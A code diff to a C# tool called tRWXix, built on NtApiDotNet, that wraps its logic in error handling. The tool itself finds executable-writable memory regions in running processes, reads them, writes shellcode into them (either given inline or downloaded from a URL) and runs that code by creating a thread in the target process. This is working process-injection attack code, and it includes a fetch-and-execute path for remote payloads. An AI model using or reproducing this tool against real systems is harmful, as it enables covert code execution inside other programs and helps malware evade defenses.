@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Runtime.InteropServices;
 using NtApiDotNet;
 
 namespace tRWXix
@@ -9,61 +8,69 @@ namespace tRWXix
     {
         public static void Main(string[] args)
         {
-            Dictionary<string, string> parameters = Utils.ArgParser.parse(args);
-
-            if (parameters.ContainsKey("enumerate"))
+            try
             {
-                foreach (NtProcess proc in NtProcess.GetProcesses(ProcessAccessRights.AllAccess))
+                Dictionary<string, string> parameters = Utils.ArgParser.parse(args);
+
+                if (parameters.ContainsKey("enumerate"))
                 {
-                    IEnumerable<MemoryInformation> mem = NtVirtualMemory.QueryMemoryInformation(proc.Handle);
-                    foreach (MemoryInformation m in mem)
+                    foreach (NtProcess proc in NtProcess.GetProcesses(ProcessAccessRights.AllAccess))
                     {
-                        if (m.Protect.Equals(MemoryAllocationProtect.ExecuteReadWrite) && m.State == MemoryState.Commit && m.Type == MemoryType.Private)
+                        IEnumerable<MemoryInformation> mem = NtVirtualMemory.QueryMemoryInformation(proc.Handle);
+                        foreach (MemoryInformation m in mem)
                         {
-                            Console.WriteLine(String.Format("[+] {0}:{1}\taddress:0x{2:X}\tsize:{3}", proc.ProcessId, proc.Name, m.BaseAddress, m.RegionSize));
+                            if (m.Protect.Equals(MemoryAllocationProtect.ExecuteReadWrite) && m.State == MemoryState.Commit && m.Type == MemoryType.Private)
+                            {
+                                Console.WriteLine(String.Format("[+] {0}:{1}\taddress:0x{2:X}\tsize:{3}", proc.ProcessId, proc.Name, m.BaseAddress, m.RegionSize));
+                            }
                         }
                     }
                 }
-            }
-            else if (parameters.ContainsKey("trigger") || parameters.ContainsKey("inject") || parameters.ContainsKey("read"))
-            {
-                if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
+                else if (parameters.ContainsKey("trigger") || parameters.ContainsKey("inject") || parameters.ContainsKey("read"))
                 {
-                    int pid = Convert.ToInt32(parameters["pid"]);
-                    NtProcess proc = NtProcess.Open(pid, ProcessAccessRights.AllAccess);
-                    long addr = (long)Convert.ToInt64(parameters["address"], 16);
-                    if (parameters.ContainsKey("read"))
+                    if (parameters.ContainsKey("pid") && parameters.ContainsKey("address"))
                     {
-                        int size = Convert.ToInt32(parameters["size"]);
-                        Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(NtVirtualMemory.ReadMemory(proc.Handle, addr, size))));
-                        Environment.Exit(0);
-                    }
-                    if (parameters.ContainsKey("inject"))
-                    {
-                        byte[] data;
-                        if (parameters.ContainsKey("data"))
+                        int pid = Convert.ToInt32(parameters["pid"]);
+                        NtProcess proc = NtProcess.Open(pid, ProcessAccessRights.AllAccess);
+                        long addr = (long)Convert.ToInt64(parameters["address"], 16);
+                        if (parameters.ContainsKey("read"))
                         {
-                            data = Utils.Shellcoder.convert(parameters["data"]);
+                            int size = Convert.ToInt32(parameters["size"]);
+                            Console.WriteLine(String.Format("[+] Memory [{0}] content: {1}", addr, BitConverter.ToString(NtVirtualMemory.ReadMemory(proc.Handle, addr, size))));
+                            Environment.Exit(0);
                         }
-                        else if (parameters.ContainsKey("url"))
+                        if (parameters.ContainsKey("inject"))
                         {
-                            data = Utils.Shellcoder.fetch(parameters["url"]);
+                            byte[] data;
+                            if (parameters.ContainsKey("data"))
+                            {
+                                data = Utils.Shellcoder.convert(parameters["data"]);
+                            }
+                            else if (parameters.ContainsKey("url"))
+                            {
+                                data = Utils.Shellcoder.fetch(parameters["url"]);
+                            }
+                            else
+                            {
+                                Console.WriteLine("[-] No data to inject...");
+                                data = new byte[] { };
+                            }
+                            Console.WriteLine("[!] Writing to the provided RWX memory region");
+                            int numberOfBytesWritten = NtVirtualMemory.WriteMemory(proc.Handle, addr, data);
+                            Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
                         }
-                        else
-                        {
-                            Console.WriteLine("[-] No data to inject...");
-                            data = new byte[] { };
-                        }
-                        Console.WriteLine("[!] Writing to the provided RWX memory region");
-                        int numberOfBytesWritten = NtVirtualMemory.WriteMemory(proc.Handle, addr, data);
-                        Console.WriteLine(String.Format("[+] {0} bytes written into RWX region", numberOfBytesWritten));
-                    }
 
-                    Console.WriteLine("[!] Executing code");
-                    if (NtThread.Create(proc, addr, 0, ThreadCreateFlags.None, 4096).ExitNtStatus == NtStatus.STATUS_PENDING) 
+                        Console.WriteLine("[!] Executing code");
+                        if (NtThread.Create(proc, addr, 0, ThreadCreateFlags.None, 4096).ExitNtStatus == NtStatus.STATUS_PENDING)
+                        {
+                            Console.WriteLine(String.Format("[+] Successfully executed code."));
+                            Environment.Exit(0);
+                        }
+                    }
+                    else
                     {
-                        Console.WriteLine(String.Format("[!] Successfully executed code."));
-                        Environment.Exit(0);
+                        Utils.Helper.help();
+                        Environment.Exit(-1);
                     }
                 }
                 else
@@ -71,12 +78,12 @@ namespace tRWXix
                     Utils.Helper.help();
                     Environment.Exit(-1);
                 }
-            }
-            else
-            {
-                Utils.Helper.help();
-                Environment.Exit(-1);
             } 
+            catch (Exception ex)
+            {
+                Console.WriteLine(String.Format("[-] {0}", ex.Message));
+                Environment.Exit(1);
+            }
         }
     }
 }
